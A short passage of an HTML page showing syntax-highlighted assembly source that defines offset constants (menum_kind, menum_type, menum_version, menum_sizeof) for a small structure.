</span><span class="sc5">menum_kind</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">menum_type</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">menum_version</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">menum_sizeof</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span></div></body>
</html>
